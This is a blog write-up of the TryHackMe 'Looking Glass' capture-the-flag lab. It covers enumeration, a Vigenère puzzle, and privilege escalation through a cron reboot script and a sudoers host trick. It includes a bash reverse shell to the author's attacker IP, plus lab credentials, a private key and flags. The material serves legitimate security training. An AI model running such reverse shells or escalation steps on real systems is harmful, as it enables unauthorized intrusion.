---
title: "[TryHackMe] Looking Glass"
author: Tri Nguyen
date: 2021-11-21 17:00:00 -0700
categories: [CTF, Write Up]
tags: [ctf, write-up, tryhackme, looking-glass, thm, wonderland]
---

IP: 10.10.219.9

# Enumeration

## nmap

- nmap reveals 4993 open ports with 7 jetdirect? ports and the rest being Dropbear ssh ports...

- Ranging from 22 to 13999.

- Seems like no http port. These could be fake SSH ports? Anyways let's try connecting to port 22. It requires a password here. Hmm seems like it's the real port. Perhaps the clue are included in the other ports? Let's try port 9000

- Connecting to port 9000 we receive a message saying `Lower`. However we can't go any lower. Recalling the name, Looking glass -> `Lower` actually means `Higher`. Now all we are left to do is try ssh `O(log(n))` ports.

- Trying something in the middle:
    - 11000: Lower -> Higher
    - 12000: Higher -> Lower
    - 11500: Higher -> Lower
    - 11250: Higher -> Lower
    - 11125: Lower -> Higher
    - 11187: Lower -> Higher
    - 11218: Higher -> Lower
    - 11202: Lower -> Higher
    - 11210: Higher -> Lower
    - 11206: Lower -> Higher
    - 11207 !!!!

- We know need to solve a puzzle.

```
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
```

- I thought Jabberwocky is the key but turns out it's not.

- I also tried with Caesar encryption but nope.

- I worked with Vigenere Cipher. Set the autosolver from 10 to 20 keys worked.

    > <https://www.boxentriq.com/code-breaking/vigenere-cipher>

    > ![Alt text](/assets/img/thm-looking-glass.png)

```
'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.

'Beware the Jabberwock, my son!
The jaws that bite, the claws that catch!
Beware the Jubjub bird, and shun
The frumious Bandersnatch!'

He took his vorpal sword in hand:
Long time the manxome foe he sought--
So rested he by the Tumtum tree,
And stood awhile in thought.

And as in uffish thought he stood,
The Jabberwock, with eyes of flame,
Came whiffling through the tulgey wood,
And burbled as it came!

One, two! One, two! And through and through
The vorpal blade went snicker-snack!
He left it dead, and with its head
He went galumphing back.

'And hast thou slain the Jabberwock?
Come to my arms, my beamish boy!
O frabjous day! Callooh! Callay!'
He chortled in his joy.

'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.
Your secret is bewareTheJabberwock
```

- We now have our secret: `bewareTheJabberwock`

- `jabberwock:FlameTheseTurnedWrist`

# SSH

```shell
jabberwock@looking-glass:~$ ls -la
total 44
drwxrwxrwx 5 jabberwock jabberwock 4096 Jul  3  2020 .
drwxr-xr-x 8 root       root       4096 Jul  3  2020 ..
lrwxrwxrwx 1 root       root          9 Jul  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 jabberwock jabberwock  220 Jun 30  2020 .bash_logout
-rw-r--r-- 1 jabberwock jabberwock 3771 Jun 30  2020 .bashrc
drwx------ 2 jabberwock jabberwock 4096 Jun 30  2020 .cache
drwx------ 3 jabberwock jabberwock 4096 Jun 30  2020 .gnupg
drwxrwxr-x 3 jabberwock jabberwock 4096 Jun 30  2020 .local
-rw-r--r-- 1 jabberwock jabberwock  807 Jun 30  2020 .profile
-rw-rw-r-- 1 jabberwock jabberwock  935 Jun 30  2020 poem.txt
-rwxrwxr-x 1 jabberwock jabberwock   38 Jul  3  2020 twasBrillig.sh
-rw-r--r-- 1 jabberwock jabberwock   38 Jul  3  2020 user.txt
jabberwock@looking-glass:~$ cat user.txt 
}32a911966cab2d643f5d57d9e0173d56{mht
jabberwock@looking-glass:~$ cat user.txt | rev
thm{65d3710e9d75d5f346d2bac669119a23}
jabberwock@looking-glass:~$ 
```

- The first flag!

# jabberwock

- Linpeas.sh shows nothing really promising.

- There are a ton of users

```shell
jabberwock@looking-glass:~$ ls /home
alice  humptydumpty  jabberwock  tryhackme  tweedledee  tweedledum
```

- After going through my linux privEsc check list these are the promising things:

```shell
jabberwock@looking-glass:~$ sudo -l
Matching Defaults entries for jabberwock on looking-glass:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jabberwock may run the following commands on looking-glass:
    (root) NOPASSWD: /sbin/reboot
jabberwock@looking-glass:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
jabberwock@looking-glass:~$ cat twasBrillig.sh 
wall $(cat /home/jabberwock/poem.txt)
```

- We know that jabberwock can reboot as root, upon reboot `tweedledum` will execute `twasBrillig.sh`.

- We can modify `twasBrillig.sh` so it gives us a shell as `tweedledum`!

```shell
jabberwock@looking-glass:~$ cat twasBrillig.sh 
bash -I >& /dev/tcp/10.2.51.175/4444 0>&1
```

- Now run `sudo reboot`

# tweedledum

- We've got a shell as `tweedledum`. I still need tty shell though lol.

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

- Go to crackstation.net and try to crack the hash (SHA256)

```
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9:maybe
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed:one
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624:of
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f:these
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6:is
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0:the
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b:
```

- The last line is unknown... 

- I used cyberchef to crack the last one, which turns out to be a hex encoded string `the password is zyxwvutsrqponmlk`

# humptydumpty

- There is a poetry.txt file saying something related to alice but no other clues otherwise.

- Notice when `ls -la /home` we see some strange permission for alice.

```shell
humptydumpty@looking-glass:/home/alice$ ls -la /home
ls -la /home
total 32
drwxr-xr-x  8 root         root         4096 Jul  3  2020 .
drwxr-xr-x 24 root         root         4096 Jul  2  2020 ..
drwx--x--x  6 alice        alice        4096 Jul  3  2020 alice
drwx------  3 humptydumpty humptydumpty 4096 Nov 27 23:06 humptydumpty
drwxrwxrwx  6 jabberwock   jabberwock   4096 Nov 27 22:23 jabberwock
drwx------  5 tryhackme    tryhackme    4096 Jul  3  2020 tryhackme
drwx------  3 tweedledee   tweedledee   4096 Jul  3  2020 tweedledee
drwx------  2 tweedledum   tweedledum   4096 Jul  3  2020 tweedledum
```

- But we can't run command there. Let's try something else. Notice every folder has these file, let's try to enumerate those of Alice.

```shell
humptydumpty@looking-glass:~$ ls -la
ls -la
total 28
drwx------ 3 humptydumpty humptydumpty 4096 Nov 27 23:06 .
drwxr-xr-x 8 root         root         4096 Jul  3  2020 ..
lrwxrwxrwx 1 root         root            9 Jul  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 humptydumpty humptydumpty  220 Jul  3  2020 .bash_logout
-rw-r--r-- 1 humptydumpty humptydumpty 3771 Jul  3  2020 .bashrc
drwx------ 3 humptydumpty humptydumpty 4096 Nov 27 23:06 .gnupg
-rw-r--r-- 1 humptydumpty humptydumpty  807 Jul  3  2020 .profile
-rw-r--r-- 1 humptydumpty humptydumpty 3084 Jul  3  2020 poetry.txt
```

- Nothing's different in those files... Hmm? Maybe alice has an `.ssh` folder?

- Correct, now we got alice's id_rsa

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
NIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ
2xrdnyxdwbtiKP1L4bq/4vU3OUcA+aYHxqhyq39arpeceHVit+jVPriHiCA73k7g
HCgpkwWczNa5MMGo+1Cg4ifzffv4uhPkxBLLl3f4rBf84RmuKEEy6bYZ+/WOEgHl
fks5ngFniW7x2R3vyq7xyDrwiXEjfW4yYe+kLiGZyyk1ia7HGhNKpIRufPdJdT+r
NGrjYFLjhzeWYBmHx7JkhkEUFIVx6ZV1y+gihQIDAQABAoIBAQDAhIA5kCyMqtQj
X2F+O9J8qjvFzf+GSl7lAIVuC5Ryqlxm5tsg4nUZvlRgfRMpn7hJAjD/bWfKLb7j
/pHmkU1C4WkaJdjpZhSPfGjxpK4UtKx3Uetjw+1eomIVNu6pkivJ0DyXVJiTZ5jF
ql2PZTVpwPtRw+RebKMwjqwo4k77Q30r8Kxr4UfX2hLHtHT8tsjqBUWrb/jlMHQO
zmU73tuPVQSESgeUP2jOlv7q5toEYieoA+7ULpGDwDn8PxQjCF/2QUa2jFalixsK
WfEcmTnIQDyOFWCbmgOvik4Lzk/rDGn9VjcYFxOpuj3XH2l8QDQ+GO+5BBg38+aJ
cUINwh4BAoGBAPdctuVRoAkFpyEofZxQFqPqw3LZyviKena/HyWLxXWHxG6ji7aW
DmtVXjjQOwcjOLuDkT4QQvCJVrGbdBVGOFLoWZzLpYGJchxmlR+RHCb40pZjBgr5
8bjJlQcp6pplBRCF/OsG5ugpCiJsS6uA6CWWXe6WC7r7V94r5wzzJpWBAoGBAM1R
aCg1/2UxIOqxtAfQ+WDxqQQuq3szvrhep22McIUe83dh+hUibaPqR1nYy1sAAhgy
wJohLchlq4E1LhUmTZZquBwviU73fNRbID5pfn4LKL6/yiF/GWd+Zv+t9n9DDWKi
WgT9aG7N+TP/yimYniR2ePu/xKIjWX/uSs3rSLcFAoGBAOxvcFpM5Pz6rD8jZrzs
SFexY9P5nOpn4ppyICFRMhIfDYD7TeXeFDY/yOnhDyrJXcbOARwjivhDLdxhzFkx
X1DPyif292GTsMC4xL0BhLkziIY6bGI9efC4rXvFcvrUqDyc9ZzoYflykL9KaCGr
+zlCOtJ8FQZKjDhOGnDkUPMBAoGBAMrVaXiQH8bwSfyRobE3GaZUFw0yreYAsKGj
oPPwkhhxA0UlXdITOQ1+HQ79xagY0fjl6rBZpska59u1ldj/BhdbRpdRvuxsQr3n
aGs//N64V4BaKG3/CjHcBhUA30vKCicvDI9xaQJOKardP/Ln+xM6lzrdsHwdQAXK
e8wCbMuhAoGBAOKy5OnaHwB8PcFcX68srFLX4W20NN6cFp12cU2QJy2MLGoFYBpa
dLnK/rW4O0JxgqIV69MjDsfRn1gZNhTTAyNnRMH1U7kUfPUB2ZXCmnCGLhAGEbY9
k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
-----END RSA PRIVATE KEY-----
```

- Let's try ssh with alice's private key.

```shell
┌──(kali㉿kali)-[~/Desktop/thm/looking-glass]
└─$ nano alice                                                                                                                           1 ⨯
                                                                                                                                             
┌──(kali㉿kali)-[~/Desktop/thm/looking-glass]
└─$ chmod 600 alice
                                                                                                                                             
┌──(kali㉿kali)-[~/Desktop/thm/looking-glass]
└─$ ssh -i alice alice@10.10.219.9
Last login: Fri Jul  3 02:42:13 2020 from 192.168.170.1
alice@looking-glass:~$ 
```

# alice

- Browsing around, there is literally nothing I can see... Again!

- Try linpeas.sh, because I'm pretty manual inspection-wise I didn't miss anything hmm..

- After several tools of enumeration (**linpeas was not working correctly, use linux smart enumeration instead**), you will eventually found out how to read the sudoer files

```shell
alice@looking-glass:~$ cd /etc/sudoers.d
alice@looking-glass:/etc/sudoers.d$ ls
README  alice  jabberwock  tweedles
alice@looking-glass:/etc/sudoers.d$ ls -la
total 24
drwxr-xr-x  2 root root 4096 Jul  3  2020 .
drwxr-xr-x 91 root root 4096 Nov 27 22:40 ..
-r--r-----  1 root root  958 Jan 18  2018 README
-r--r--r--  1 root root   49 Jul  3  2020 alice
-r--r-----  1 root root   57 Jul  3  2020 jabberwock
-r--r-----  1 root root  120 Jul  3  2020 tweedles
alice@looking-glass:/etc/sudoers.d$ cat alice
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

```shell
alice@looking-glass:/etc/sudoers.d$ cat alice
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
alice@looking-glass:/etc/sudoers.d$ sudo -h ssalg-gnikool -l
sudo: unable to resolve host ssalg-gnikool
Matching Defaults entries for alice on ssalg-gnikool:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on ssalg-gnikool:
    (root) NOPASSWD: /bin/bash
alice@looking-glass:/etc/sudoers.d$ sudo -h ssalg-gnikool /bin/bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:/etc/sudoers.d# 
```

- We've got root!

- `thm{bc2337b6f97d057b01da718ced6ead3f}`

# Final Words:

- Another pretty interesting and hard box. Really challenge your PrivEsc and Enumeration skill!